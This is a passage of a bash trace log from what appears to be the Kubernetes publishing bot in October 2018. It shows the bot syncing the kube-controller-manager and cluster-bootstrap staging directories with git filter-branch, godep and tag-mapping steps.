'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' -z 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ local split_recursive_delete_pattern\n>\t+ read -r -a split_recursive_delete_pattern\n>\t+ git rm -q --ignore-unmatch -r BUILD '*/BUILD' BUILD.bazel '*/BUILD.bazel' Gopkg.toml\n>\t+ git add -u\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t++ git rev-parse HEAD\n>\t+ local dst_old_head=a9337666b29bf2d9c68a01115958c76405c65da3\n>\t+ local k_pending_merge_commit=\n>\t+ local dst_needs_godeps_update=false\n>\t++ git rev-parse HEAD\n>\tFixing up godeps after a complete sync\n>\t+ local dst_merge_point_commit=a9337666b29bf2d9c68a01115958c76405c65da3\n>\t+ for f_mainline_commit in '${f_mainline_commits}' FLUSH_PENDING_MERGE_COMMIT\n>\t+ local k_mainline_commit=\n>\t+ local k_new_pending_merge_commit=\n>\t+ '[' FLUSH_PENDING_MERGE_COMMIT = FLUSH_PENDING_MERGE_COMMIT ']'\n>\t+ k_new_pending_merge_commit=FLUSH_PENDING_MERGE_COMMIT\n>\t+ '[' -n '' ']'\n>\t+ k_pending_merge_commit=FLUSH_PENDING_MERGE_COMMIT\n>\t+ '[' FLUSH_PENDING_MERGE_COMMIT = FLUSH_PENDING_MERGE_COMMIT ']'\n>\t+ break\n>\t+ echo 'Fixing up godeps after a complete sync'\n>\t++ git rev-parse HEAD\n>\t+ '[' a9337666b29bf2d9c68a01115958c76405c65da3 '!=' a9337666b29bf2d9c68a01115958c76405c65da3 ']'\n>\t+ '[' false = true ']'\n>\t+ fix-godeps apimachinery:master,apiserver:master '' k8s.io true true false Kubernetes-commit 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' '' = true ']'\n>\t+ local deps=apimachinery:master,apiserver:master\n>\t+ local required_packages=\n>\t+ local base_package=k8s.io\n>\t+ local is_library=true\n>\t+ local needs_godeps_update=true\n>\t+ local squash=false\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t++ git rev-parse HEAD\n>\t+ local dst_old_commit=a9337666b29bf2d9c68a01115958c76405c65da3\n>\t+ '[' true = true ']'\n>\t+ update_full_godeps apimachinery:master,apiserver:master k8s.io true Kubernetes-commit\n>\t+ local deps=apimachinery:master,apiserver:master\n>\t+ local base_package=k8s.io\n>\t+ local is_library=true\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\tRemoving k8s.io/* dependencies from Godeps.json\n>\t+ for d in '$../*'\n>\t+ '[' '!' -d '$../*' ']'\n>\t+ continue\n>\t+ '[' '!' -f Godeps/Godeps.json ']'\n>\t+ echo 'Removing k8s.io/* dependencies from Godeps.json'\n>\t+ local dep=\n>\t+ local branch=\n>\t+ local depbranch=\n>\t++ basename /go-workspace/src/k8s.io/kube-controller-manager\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/apimachinery/\") or . == \"k8s.io/apimachinery\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/apiserver/\") or . == \"k8s.io/apiserver\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/kube-controller-manager/\") or . == \"k8s.io/kube-controller-manager\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\tRunning godep restore.\n>\t+ echo 'Running godep restore.'\n>\t+ godep restore\n>\t+ checkout-deps-to-kube-commit Kubernetes-commit apimachinery:master,apiserver:master\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ deps=()\n>\t+ local deps\n>\t+ IFS=,\n>\t+ read -a deps\n>\t++ last-kube-commit Kubernetes-commit HEAD\n>\t++ local commit_msg_tag=Kubernetes-commit\n>\t++ grep '^Kubernetes-commit: '\n>\t++ git log --format=%B HEAD\n>\t++ sed 's/^Kubernetes-commit: //g'\n>\t++ head -n 1\n>\t+ local k_last_kube_commit=a6eb49f0dc9a6d9fecf7ff4a8edeaa382b55ac50\n>\t+ '[' -z a6eb49f0dc9a6d9fecf7ff4a8edeaa382b55ac50 ']'\n>\t++ git-find-merge a6eb49f0dc9a6d9fecf7ff4a8edeaa382b55ac50 upstream-branch\n>\t++ tail -1\n>\t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>\t+++ git rev-list a6eb49f0dc9a6d9fecf7ff4a8edeaa382b55ac50..upstream-branch --ancestry-path\n>\t+++ git rev-list 'a6eb49f0dc9a6d9fecf7ff4a8edeaa382b55ac50^1..upstream-branch' --first-parent\n>\t+++ git rev-parse a6eb49f0dc9a6d9fecf7ff4a8edeaa382b55ac50\n>\tLooking up which commit in the master branch of k8s.io/apimachinery corresponds to k8s.io/kubernetes commit a6eb49f0dc9a6d9fecf7ff4a8edeaa382b55ac50.\n>\t+ local k_last_kube_merge=a6eb49f0dc9a6d9fecf7ff4a8edeaa382b55ac50\n>\t+ local dep_count=2\n>\t+ (( i=0 ))\n>\t+ (( i<2 ))\n>\t+ local dep=apimachinery\n>\t+ local branch=master\n>\t+ echo 'Looking up which commit in the master branch of k8s.io/apimachinery corresponds to k8s.io/kubernetes commit a6eb49f0dc9a6d9fecf7ff4a8edeaa382b55ac50.'\n>\t+ local k_commit=\n>\t+ local dep_commit=\n>\t+ read k_commit dep_commit\n>\t++ look -b a6eb49f0dc9a6d9fecf7ff4a8edeaa382b55ac50 ../kube-commits-apimachinery-master\n>\tChecking out k8s.io/apimachinery to cdac837abb323d610ee074068a16915651f888dd\n>\t+ '[' -z cdac837abb323d610ee074068a16915651f888dd ']'\n>\t+ pushd ../apimachinery\n>\t+ echo 'Checking out k8s.io/apimachinery to cdac837abb323d610ee074068a16915651f888dd'\n>\t+ git checkout -q cdac837abb323d610ee074068a16915651f888dd\n>\tLooking up which commit in the master branch of k8s.io/apiserver corresponds to k8s.io/kubernetes commit a6eb49f0dc9a6d9fecf7ff4a8edeaa382b55ac50.\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<2 ))\n>\t+ local dep=apiserver\n>\t+ local branch=master\n>\t+ echo 'Looking up which commit in the master branch of k8s.io/apiserver corresponds to k8s.io/kubernetes commit a6eb49f0dc9a6d9fecf7ff4a8edeaa382b55ac50.'\n>\t+ local k_commit=\n>\t+ local dep_commit=\n>\t+ read k_commit dep_commit\n>\t++ look -b a6eb49f0dc9a6d9fecf7ff4a8edeaa382b55ac50 ../kube-commits-apiserver-master\n>\tChecking out k8s.io/apiserver to 75a03c2d437ac87229cdc1d43c039a4e7bf7ecf5\n>\t+ '[' -z 75a03c2d437ac87229cdc1d43c039a4e7bf7ecf5 ']'\n>\t+ pushd ../apiserver\n>\t+ echo 'Checking out k8s.io/apiserver to 75a03c2d437ac87229cdc1d43c039a4e7bf7ecf5'\n>\t+ git checkout -q 75a03c2d437ac87229cdc1d43c039a4e7bf7ecf5\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<2 ))\n>\t+ rm -rf ./Godeps\n>\t+ rm -rf ./vendor\n>\t+ echo 'Running godep save.'\n>\t+ godep save ./...\n>\tRunning godep save.\n>\t+ cp Godeps/Godeps.json Godeps/Godeps.json.preserve\n>\t+ git checkout HEAD Godeps/\n>\t+ mv Godeps/Godeps.json.preserve Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ jq 'del(.Deps[].Comment)' Godeps/Godeps.json\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ '[' true = true ']'\n>\t++ git rev-parse --abbrev-ref HEAD\n>\tRemoving k8s.io/*, gofuzz, go-openapi and glog from vendor/ because this is a library.\n>\t+ '[' master '!=' master ']'\n>\t+ echo 'Removing k8s.io/*, gofuzz, go-openapi and glog from vendor/ because this is a library.'\n>\t+ rm -rf ./vendor/github.com/golang/glog\n>\t+ rm -rf ./vendor/k8s.io\n>\t+ rm -rf ./vendor/github.com/google/gofuzz\n>\t+ rm -rf ./vendor/github.com/go-openapi\n>\t+ git add Godeps/Godeps.json\n>\t+ git clean -f Godeps\n>\t+ git add vendor/ --ignore-errors\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t+ echo 'Godeps.json hasn'\\''t changed!'\n>\t+ ensure-clean-working-dir\n>\tGodeps.json hasn't changed!\n>\t+ git diff HEAD --exit-code\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ '[' master '!=' master ']'\n>\t+ '[' -n '' ']'\n>\t+ apply-recursive-delete-pattern 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' -z 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ local split_recursive_delete_pattern\n>\t+ read -r -a split_recursive_delete_pattern\n>\t+ git rm -q --ignore-unmatch -r BUILD '*/BUILD' BUILD.bazel '*/BUILD.bazel' Gopkg.toml\n>\t+ git add -u\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t+ git diff --exit-code a9337666b29bf2d9c68a01115958c76405c65da3\n>\tRemove redundant godep commits on-top of a9337666b29bf2d9c68a01115958c76405c65da3.\n>\t+ echo 'Remove redundant godep commits on-top of a9337666b29bf2d9c68a01115958c76405c65da3.'\n>\t+ git reset --soft -q a9337666b29bf2d9c68a01115958c76405c65da3\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\t++ basename /go-workspace/src/k8s.io/kube-controller-manager\n>\t+ local repo=kube-controller-manager\n>\t++ head -n 1\n>\t++ git log --oneline --first-parent --merges\n>\tWriting k8s.io/kubernetes commit lookup table to ../kube-commits-kube-controller-manager-master\n>\t+ '[' -n '481b401 Merge pull request #68195 from luxas/consolidate_componentconfig_code_standards' ']'\n>\t+ echo 'Writing k8s.io/kubernetes commit lookup table to ../kube-commits-kube-controller-manager-master'\n>\t++ sed 's/^./\\L\\u&/'\n>\t++ echo kubernetes\n>\t+ /collapsed-kube-commit-mapper --commit-message-tag Kubernetes-commit --source-branch refs/heads/upstream-branch\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ LAST_BRANCH=master\n>\t++ git rev-parse HEAD\n>\t+ LAST_HEAD=a9337666b29bf2d9c68a01115958c76405c65da3\n>\t+ EXTRA_ARGS=()\n>\t+ PUSH_SCRIPT=../push-tags-kube-controller-manager-master.sh\n>\t+ echo '#!/bin/bash'\n>\t+ chmod +x ../push-tags-kube-controller-manager-master.sh\n>\t+ '[' -z '' ']'\n>\t++ echo kubernetes\n>\t++ sed 's/^./\\L\\u&/'\n>\t++ echo kubernetes\n>\t+ /sync-tags --prefix kubernetes- --commit-message-tag Kubernetes-commit --source-remote upstream --source-branch master --push-script ../push-tags-kube-controller-manager-master.sh --dependencies apimachinery:master,apiserver:master --mapping-output-file '../tag-kube-controller-manager-{{.Tag}}-mapping' -alsologtostderr ''\n>\tRemoving all local copies of origin and upstream tags.\n>\tFetching tags from remote \"upstream\".\n>\tFetching tags from remote \"origin\".\n>\tComputing mapping from kube commits to the local branch \"master\" at a9337666b29bf2d9c68a01115958c76405c65da3 because \"kubernetes-1.9.0-alpha.2\" seems to be relevant.\n>\t++ git rev-parse master\n>\t+ '[' a9337666b29bf2d9c68a01115958c76405c65da3 '!=' a9337666b29bf2d9c68a01115958c76405c65da3 ']'\n>\t+ git checkout master\n>\tYour branch is up-to-date with 'origin/master'.\n>\tAlready on 'master'\n>[09 Oct 18 18:00 UTC]: Successfully constructed master\n>[09 Oct 18 18:00 UTC]: /publish_scripts/construct.sh kube-controller-manager release-1.12 release-1.12 apimachinery:release-1.12,apiserver:release-1.12  /go-workspace/src/k8s.io/kubernetes/.git staging/src/k8s.io/kube-controller-manager kubernetes kubernetes k8s.io true \"BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml\"  243557ba3da96995db4f8efbc756fc935d074739\n>\t+ '[' '!' 14 -eq 14 ']'\n>\t+ REPO=kube-controller-manager\n>\t+ SRC_BRANCH=release-1.12\n>\t+ DST_BRANCH=release-1.12\n>\t+ DEPS=apimachinery:release-1.12,apiserver:release-1.12\n>\t+ REQUIRED=\n>\t+ SOURCE_REMOTE=/go-workspace/src/k8s.io/kubernetes/.git\n>\t+ SUBDIR=staging/src/k8s.io/kube-controller-manager\n>\t+ SOURCE_REPO_ORG=kubernetes\n>\t+ SOURCE_REPO_NAME=kubernetes\n>\t+ shift 9\n>\t+ BASE_PACKAGE=k8s.io\n>\t+ IS_LIBRARY=true\n>\t+ RECURSIVE_DELETE_PATTERN='BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ SKIP_TAGS=\n>\t+ LAST_PUBLISHED_UPSTREAM_HASH=243557ba3da96995db4f8efbc756fc935d074739\n>\t+ readonly REPO SRC_BRANCH DST_BRANCH DEPS REQUIRED SOURCE_REMOTE SOURCE_REPO_ORG SUBDIR SOURCE_REPO_NAME BASE_PACKAGE IS_LIBRARY RECURSIVE_DELETE_PATTERN SKIP_TAGS LAST_PUBLISHED_UPSTREAM_HASH\n>\t++ dirname /publish_scripts/construct.sh\n>\t+ SCRIPT_DIR=/publish_scripts\n>\t+ source /publish_scripts/util.sh\n>\t++ set -o errexit\n>\t++ set -o nounset\n>\t++ set -o pipefail\n>\t++ set -o xtrace\n>\t+ echo 'Running garbage collection.'\n>\t+ git gc --auto\n>\tRunning garbage collection.\n>\tFetching from origin.\n>\t+ echo 'Fetching from origin.'\n>\t+ git fetch origin --no-tags --prune\n>\tCleaning up checkout.\n>\t+ echo 'Cleaning up checkout.'\n>\t+ git rebase --abort\n>\tNo rebase in progress?\n>\t+ true\n>\t+ git reset -q --hard\n>\t+ git clean -q -f -f -d\n>\t++ git rev-parse HEAD\n>\t+ git checkout -q a9337666b29bf2d9c68a01115958c76405c65da3\n>\t+ git branch -D release-1.12\n>\t+ git remote set-head origin -d\n>\t+ git rev-parse origin/release-1.12\n>\tSwitching to origin/release-1.12.\n>\t+ echo 'Switching to origin/release-1.12.'\n>\t+ git branch -f release-1.12 origin/release-1.12\n>\t+ git checkout -q release-1.12\n>\tFetching upstream changes.\n>\t+ echo 'Fetching upstream changes.'\n>\t+ grep -w -q upstream\n>\t+ git remote\n>\t+ git remote set-url upstream /go-workspace/src/k8s.io/kubernetes/.git\n>\t+ git fetch -q upstream --no-tags --prune\n>\t++ git rev-parse upstream/release-1.12\n>\tSkipping sync because upstream/release-1.12 at 243557ba3da96995db4f8efbc756fc935d074739 did not change since last sync.\n>\t+ UPSTREAM_HASH=243557ba3da96995db4f8efbc756fc935d074739\n>\t+ '[' 243557ba3da96995db4f8efbc756fc935d074739 '!=' 243557ba3da96995db4f8efbc756fc935d074739 ']'\n>\t+ echo 'Skipping sync because upstream/release-1.12 at 243557ba3da96995db4f8efbc756fc935d074739 did not change since last sync.'\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ LAST_BRANCH=release-1.12\n>\t++ git rev-parse HEAD\n>\t+ LAST_HEAD=7585de142f540d0e0fc5c986d4e3aea354ff97c3\n>\t+ EXTRA_ARGS=()\n>\t+ PUSH_SCRIPT=../push-tags-kube-controller-manager-release-1.12.sh\n>\t+ echo '#!/bin/bash'\n>\t+ chmod +x ../push-tags-kube-controller-manager-release-1.12.sh\n>\t+ '[' -z '' ']'\n>\t++ echo kubernetes\n>\t++ sed 's/^./\\L\\u&/'\n>\t++ echo kubernetes\n>\t+ /sync-tags --prefix kubernetes- --commit-message-tag Kubernetes-commit --source-remote upstream --source-branch release-1.12 --push-script ../push-tags-kube-controller-manager-release-1.12.sh --dependencies apimachinery:release-1.12,apiserver:release-1.12 --mapping-output-file '../tag-kube-controller-manager-{{.Tag}}-mapping' -alsologtostderr ''\n>\tRemoving all local copies of origin and upstream tags.\n>\tFetching tags from remote \"upstream\".\n>\tFetching tags from remote \"origin\".\n>\tComputing mapping from kube commits to the local branch \"release-1.12\" at 7585de142f540d0e0fc5c986d4e3aea354ff97c3 because \"kubernetes-1.11.0-alpha.2\" seems to be relevant.\n>\t++ git rev-parse release-1.12\n>\t+ '[' 7585de142f540d0e0fc5c986d4e3aea354ff97c3 '!=' 7585de142f540d0e0fc5c986d4e3aea354ff97c3 ']'\n>\t+ git checkout release-1.12\n>\tYour branch is up-to-date with 'origin/release-1.12'.\n>\tAlready on 'release-1.12'\n>[09 Oct 18 18:01 UTC]: Successfully constructed release-1.12\n>[09 Oct 18 18:01 UTC]: Successfully ensured /go-workspace/src/k8s.io/cluster-bootstrap exists\n>[09 Oct 18 18:01 UTC]: /bin/bash -c \"git tag | xargs git tag -d >/dev/null\"\n>[09 Oct 18 18:01 UTC]: /publish_scripts/construct.sh cluster-bootstrap master master apimachinery:master,api:master  /go-workspace/src/k8s.io/kubernetes/.git staging/src/k8s.io/cluster-bootstrap kubernetes kubernetes k8s.io true \"BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml\"  4966faab3618ff2889326a3e64ef2bbb7433e610\n>\t+ '[' '!' 14 -eq 14 ']'\n>\t+ REPO=cluster-bootstrap\n>\t+ SRC_BRANCH=master\n>\t+ DST_BRANCH=master\n>\t+ DEPS=apimachinery:master,api:master\n>\t+ REQUIRED=\n>\t+ SOURCE_REMOTE=/go-workspace/src/k8s.io/kubernetes/.git\n>\t+ SUBDIR=staging/src/k8s.io/cluster-bootstrap\n>\t+ SOURCE_REPO_ORG=kubernetes\n>\t+ SOURCE_REPO_NAME=kubernetes\n>\t+ shift 9\n>\t+ BASE_PACKAGE=k8s.io\n>\t+ IS_LIBRARY=true\n>\t+ RECURSIVE_DELETE_PATTERN='BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ SKIP_TAGS=\n>\t+ LAST_PUBLISHED_UPSTREAM_HASH=4966faab3618ff2889326a3e64ef2bbb7433e610\n>\t+ readonly REPO SRC_BRANCH DST_BRANCH DEPS REQUIRED SOURCE_REMOTE SOURCE_REPO_ORG SUBDIR SOURCE_REPO_NAME BASE_PACKAGE IS_LIBRARY RECURSIVE_DELETE_PATTERN SKIP_TAGS LAST_PUBLISHED_UPSTREAM_HASH\n>\t++ dirname /publish_scripts/construct.sh\n>\tRunning garbage collection.\n>\t+ SCRIPT_DIR=/publish_scripts\n>\t+ source /publish_scripts/util.sh\n>\t++ set -o errexit\n>\t++ set -o nounset\n>\t++ set -o pipefail\n>\t++ set -o xtrace\n>\t+ echo 'Running garbage collection.'\n>\t+ git gc --auto\n>\t+ echo 'Fetching from origin.'\n>\t+ git fetch origin --no-tags --prune\n>\tFetching from origin.\n>\tCleaning up checkout.\n>\t+ echo 'Cleaning up checkout.'\n>\t+ git rebase --abort\n>\tNo rebase in progress?\n>\t+ true\n>\t+ git reset -q --hard\n>\t+ git clean -q -f -f -d\n>\t++ git rev-parse HEAD\n>\t+ git checkout -q 6cc12ac9d30b948591694f72f75a1d8dd00395e7\n>\t+ git branch -D master\n>\t+ git remote set-head origin -d\n>\tSwitching to origin/master.\n>\t+ git rev-parse origin/master\n>\t+ echo 'Switching to origin/master.'\n>\t+ git branch -f master origin/master\n>\t+ git checkout -q master\n>\tFetching upstream changes.\n>\t+ echo 'Fetching upstream changes.'\n>\t+ grep -w -q upstream\n>\t+ git remote\n>\t+ git remote set-url upstream /go-workspace/src/k8s.io/kubernetes/.git\n>\t+ git fetch -q upstream --no-tags --prune\n>\t++ git rev-parse upstream/master\n>\tUpstream branch upstream/master moved from '4966faab3618ff2889326a3e64ef2bbb7433e610' to '686b37ff9be554dc030b60d4624d5a512d5dd735'. We have to sync.\n>\t+ UPSTREAM_HASH=686b37ff9be554dc030b60d4624d5a512d5dd735\n>\t+ '[' 686b37ff9be554dc030b60d4624d5a512d5dd735 '!=' 4966faab3618ff2889326a3e64ef2bbb7433e610 ']'\n>\t+ echo 'Upstream branch upstream/master moved from '\\''4966faab3618ff2889326a3e64ef2bbb7433e610'\\'' to '\\''686b37ff9be554dc030b60d4624d5a512d5dd735'\\''. We have to sync.'\n>\t+ sync_repo kubernetes kubernetes staging/src/k8s.io/cluster-bootstrap master master apimachinery:master,api:master '' k8s.io true 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local source_repo_org=kubernetes\n>\t+ local source_repo_name=kubernetes\n>\t+ local subdirectory=staging/src/k8s.io/cluster-bootstrap\n>\t+ local src_branch=master\n>\t+ local dst_branch=master\n>\t+ local deps=apimachinery:master,api:master\n>\t+ local required_packages=\n>\t+ local base_package=k8s.io\n>\t+ local is_library=true\n>\t+ shift 9\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ readonly subdirectory src_branch dst_branch deps is_library\n>\t+ local new_branch=false\n>\t+ local orphan=false\n>\t+ git rev-parse -q --verify HEAD\n>\t6cc12ac9d30b948591694f72f75a1d8dd00395e7\n>\t++ ls -1\n>\t++ wc -l\n>\tStarting at existing master commit 6cc12ac9d30b948591694f72f75a1d8dd00395e7.\n>\t+ '[' 9 = 0 ']'\n>\t++ git rev-parse HEAD\n>\t+ echo 'Starting at existing master commit 6cc12ac9d30b948591694f72f75a1d8dd00395e7.'\n>\t+ git branch -D filtered-branch\n>\t+ git branch -f upstream-branch upstream/master\n>\tBranch upstream-branch set up to track remote branch master from upstream.\n>\t++ git rev-parse upstream-branch\n>\tChecked out source commit 686b37ff9be554dc030b60d4624d5a512d5dd735.\n>\t+ echo 'Checked out source commit 686b37ff9be554dc030b60d4624d5a512d5dd735.'\n>\t+ git checkout -q upstream-branch -b filtered-branch\n>\t+ git reset -q --hard upstream-branch\n>\t+ local f_mainline_commits=\n>\t+ '[' false = true ']'\n>\t+ '[' false = true ']'\n>\t++ last-kube-commit Kubernetes-commit master\n>\t++ local commit_msg_tag=Kubernetes-commit\n>\t++ git log --format=%B master\n>\t++ grep '^Kubernetes-commit: '\n>\t++ sed 's/^Kubernetes-commit: //g'\n>\t++ head -n 1\n>\t+ local k_base_commit=c179a9c9df4bfb6421258a5f31da9f595474ada4\n>\t+ '[' -z c179a9c9df4bfb6421258a5f31da9f595474ada4 ']'\n>\t++ git-find-merge c179a9c9df4bfb6421258a5f31da9f595474ada4 upstream/master\n>\t++ tail -1\n>\t+++ git rev-list 'c179a9c9df4bfb6421258a5f31da9f595474ada4^1..upstream/master' --first-parent\n>\t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>\t+++ git rev-list c179a9c9df4bfb6421258a5f31da9f595474ada4..upstream/master --ancestry-path\n>\t+++ git rev-parse c179a9c9df4bfb6421258a5f31da9f595474ada4\n>\t+ local k_base_merge=c179a9c9df4bfb6421258a5f31da9f595474ada4\n>\t+ '[' -z c179a9c9df4bfb6421258a5f31da9f595474ada4 ']'\n>\t+ git branch -f filtered-branch-base c179a9c9df4bfb6421258a5f31da9f595474ada4\n>\tRewriting upstream branch master to only include commits for staging/src/k8s.io/cluster-bootstrap.\n>\tRunning git filter-branch ...\n>\t+ echo 'Rewriting upstream branch master to only include commits for staging/src/k8s.io/cluster-bootstrap.'\n>\t+ filter-branch Kubernetes-commit staging/src/k8s.io/cluster-bootstrap 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' filtered-branch filtered-branch-base\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ local subdirectory=staging/src/k8s.io/cluster-bootstrap\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ echo 'Running git filter-branch ...'\n>\t+ local index_filter=\n>\t+ '[' -n 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ patterns=()\n>\t+ local patterns\n>\t+ local p=\n>\t+ index_filter='git rm -q --cached --ignore-unmatch -r'\n>\t+ IFS=' '\n>\t+ read -ra patterns\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''BUILD'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''*/BUILD'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''BUILD.bazel'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''*/BUILD.bazel'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''Gopkg.toml'\\'''\n>\t+ git filter-branch -f --index-filter 'git rm -q --cached --ignore-unmatch -r '\\''BUILD'\\'' '\\''*/BUILD'\\'' '\\''BUILD.bazel'\\'' '\\''*/BUILD.bazel'\\'' '\\''Gopkg.toml'\\''' --msg-filter 'awk 1 && echo && echo \"Kubernetes-commit: ${GIT_COMMIT}\"' --subdirectory-filter staging/src/k8s.io/cluster-bootstrap -- filtered-branch filtered-branch-base\n>\t++ git rev-parse filtered-branch-base\n>\t+ local f_base_commit=5cf4b97b414afd0a3a203bc0d3798d7ba6b7979e\n>\t++ git log --first-parent --format=%H --reverse 5cf4b97b414afd0a3a203bc0d3798d7ba6b7979e..HEAD\n>\t+ f_mainline_commits=\n>\t+ echo 'Checking out branch master.'\n>\tChecking out branch master.\n>\t+ git checkout -q master\n>\t+ '[' -f kubernetes-sha ']'\n>\t+ apply-recursive-delete-pattern 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' -z 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ local split_recursive_delete_pattern\n>\t+ read -r -a split_recursive_delete_pattern\n>\t+ git rm -q --ignore-unmatch -r BUILD '*/BUILD' BUILD.bazel '*/BUILD.bazel' Gopkg.toml\n>\t+ git add -u\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t++ git rev-parse HEAD\n>\t+ local dst_old_head=6cc12ac9d30b948591694f72f75a1d8dd00395e7\n>\t+ local k_pending_merge_commit=\n>\t+ local dst_needs_godeps_update=false\n>\t++ git rev-parse HEAD\n>\tFixing up godeps after a complete sync\n>\t+ local dst_merge_point_commit=6cc12ac9d30b948591694f72f75a1d8dd00395e7\n>\t+ for f_mainline_commit in '${f_mainline_commits}' FLUSH_PENDING_MERGE_COMMIT\n>\t+ local k_mainline_commit=\n>\t+ local k_new_pending_merge_commit=\n>\t+ '[' FLUSH_PENDING_MERGE_COMMIT = FLUSH_PENDING_MERGE_COMMIT ']'\n>\t+ k_new_pending_merge_commit=FLUSH_PENDING_MERGE_COMMIT\n>\t+ '[' -n '' ']'\n>\t+ k_pending_merge_commit=FLUSH_PENDING_MERGE_COMMIT\n>\t+ '[' FLUSH_PENDING_MERGE_COMMIT = FLUSH_PENDING_MERGE_COMMIT ']'\n>\t+ break\n>\t+ echo 'Fixing up godeps after a complete sync'\n>\t++ git rev-parse HEAD\n>\t+ '[' 6cc12ac9d30b948591694f72f75a1d8dd00395e7 '!=' 6cc12ac9d30b948591694f72f75a1d8dd00395e7 ']'\n>\t+ '[' false = true ']'\n>\t+ fix-godeps apimachinery:master,api:master '' k8s.io true true false Kubernetes-commit 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' '' = true ']'\n>\t+ local deps=apimachinery:master,api:master\n>\t+ local required_packages=\n>\t+ local base_package=k8s.io\n>\t+ local is_library=true\n>\t+ local needs_godeps_update=true\n>\t+ local squash=false\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t++ git rev-parse HEAD\n>\t+ local dst_old_commit=6cc12ac9d30b948591694f72f75a1d8dd00395e7\n>\t+ '[' true = true ']'\n>\t+ update_full_godeps apimachinery:master,api:master k8s.io true Kubernetes-commit\n>\t+ local deps=apimachinery:master,api:master\n>\t+ local base_package=k8s.io\n>\t+ local is_library=true\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\tRemoving k8s.io/* dependencies from Godeps.json\n>\t+ for d in '$../*'\n>\t+ '[' '!' -d '$../*' ']'\n>\t+ continue\n>\t+ '[' '!' -f Godeps/Godeps.json ']'\n>\t+ echo 'Removing k8s.io/* dependencies from Godeps.json'\n>\t+ local 